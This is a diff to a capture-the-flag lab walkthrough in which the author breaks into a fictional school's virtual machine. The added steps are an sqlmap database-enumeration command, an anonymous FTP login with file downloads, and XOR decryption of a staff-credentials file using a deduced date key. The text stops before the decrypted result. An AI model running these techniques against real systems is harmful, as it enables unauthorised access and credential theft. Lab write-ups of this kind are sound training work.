@@ -138,7 +138,7 @@ I will start by using [Metasploit Framework](https://github.com/rapid7/metasploi
    ```
    do remember to inform staff of the following:
    attached encrypted file contains shared staff account credentials.
-   the file is encrypted in XOR forma
+   the file is encrypted in XOR format
    the password of the file will be the date of the School's Anniversary in DD/MM/YYYY format
    ```
 
@@ -174,7 +174,7 @@ I will start by using [Metasploit Framework](https://github.com/rapid7/metasploi
 
     Since I managed to access `Malcolm`'s account, but am unable to access any accounts with invalid credentials, I assumed that there could be a database in the backend.
 
-15) Using [SQLMap](https://github.com/sqlmapproject/sqlmap) to enumerate data from the database, I received the following output:
+15) Using [SQLMap](https://github.com/sqlmapproject/sqlmap) to enumerate data from the database with the following command: `sqlmap -u https://potatos.potato-school.com/login.php --dbs --forms -a`, I received the following output:
 
     ```
     Database: school_db
@@ -325,4 +325,78 @@ I will start by using [Metasploit Framework](https://github.com/rapid7/metasploi
 
 22) Since the ftp port is open, I decided to try to access the Pootato VM via the ftp port. Howevever, attempts to login via ftp with the student credentials obtained from the output of [SQLMap](https://github.com/sqlmapproject/sqlmap) was unsuccessful, I decided to find other ways to login via ftp. Searching online, I found out that it might be possible to log into the ftp server as an `anonymous` user, which I attempted to do so & gained access.
 
-    
+    ```
+    ┌──(ctf)─(kali㉿kali)-[~]
+    └─$ ftp 192.168.233.137
+    Connected to 192.168.233.137.
+    220 (vsFTPd 3.0.3)
+    Name (192.168.233.137:kali): anonymous
+    230 Login successful.
+    Remote system type is UNIX.
+    Using binary mode to transfer files.
+    ftp> 
+    ```
+
+    Upon gaining access, as I know that there are 2 types of ftp connection modes, I decided to go with the passive mode & explore the files in the ftp server. Using the `ls` command, I can see that the `Drafts` directory is available. Accessing the `Drafts` directory & using the `ls` command, it showed that the following files were present in the `Drafts` directory: `Encrypted_Attachment.dat` & `staff_email_draft.txt`. Using the `get` command, I downloaded the files into my [Kali Linux](https://www.kali.org/) machine.
+
+    ```
+    ftp> passive
+    Passive mode: off; fallback to active mode: off.
+    ftp> cd Drafts
+    250 Directory successfully changed.
+    ftp> ls
+    200 EPRT command successful. Consider using EPSV.
+    150 Here comes the directory listing.
+    -r-xr-xr-x    1 119      128            58 Nov 05 17:20 Encrypted_Attachment.dat
+    -r-xr-xr-x    1 119      128           759 Nov 05 09:18 staff_email_draft.txt
+    226 Directory send OK.
+    ftp> get Encrypted_Attachment.dat
+    local: Encrypted_Attachment.dat remote: Encrypted_Attachment.dat
+    200 EPRT command successful. Consider using EPSV.
+    150 Opening BINARY mode data connection for Encrypted_Attachment.dat (58 bytes).
+    100% |**********************************************************|    58        2.78 KiB/s    00:00 ETA
+    226 Transfer complete.
+    58 bytes received in 00:00 (2.60 KiB/s)
+    ftp> get staff_email_draft.txt
+    local: staff_email_draft.txt remote: staff_email_draft.txt
+    200 EPRT command successful. Consider using EPSV.
+    150 Opening BINARY mode data connection for staff_email_draft.txt (759 bytes).
+    100% |**********************************************************|   759      336.91 KiB/s    00:00 ETA
+    226 Transfer complete.
+    759 bytes received in 00:00 (213.48 KiB/s)
+    ftp>
+    ```
+
+23) Now that the files `Encrypted_Attachment.dat` & `staff_email_draft.txt` have been downloaded into my [Kali Linux](https://www.kali.org/) machine, I decided to first view the contents of `staff_email_draft.txt`:
+
+    ```                                                                                                        
+    ──(ctf)─(kali㉿kali)-[~]
+    └─$ cat staff_email_draft.txt 
+    Subject: Implementation of New User Dashboard and Shared Staff Account
+
+    Dear Staff,
+
+    I hope this message finds you well.
+
+    I am writing to inform you about the implementation of a shared staff account that will be introduced to facilitate collaboration and streamline access to         essential resources within our school. This shared staff account will be launched together with the new user dashboard.
+
+    We believe this shared account will enhance our ability to work together more effectively and improve our overall productivity. This shared account                credentials will be announced during a briefing later on after the School's Anniversary.
+
+    If you have any questions or need further clarification, please do not hesitate to reach out.
+
+    Best regards,
+    Potato School
+    ```
+
+    Reviewing the contents of `staff_email_draft.txt`, it is stated that there would be an implementation of a shared staff account that will be launched together with the new user dashboard. In the output of `https://potatos.potato-school.com/briefingnotes.txt`, it was stated:
+
+    ```
+    do remember to inform staff of the following:
+    attached encrypted file contains shared staff account credentials.
+    the file is encrypted in XOR format
+    the password of the file will be the date of the School's Anniversary in DD/MM/YYYY format
+    ```
+
+    This meant that the file `Encrypted_Attachment.dat` is encrypted in XOR format, and that the password to decrypt the file is _12/11/2006_ which was deduced from the email in Roundcube Webmail. Using [CyberChef](https://gchq.github.io/CyberChef) & selecting the XOR _recipe_ with _12/11/2006_ as the key, the output given was:
+
+     
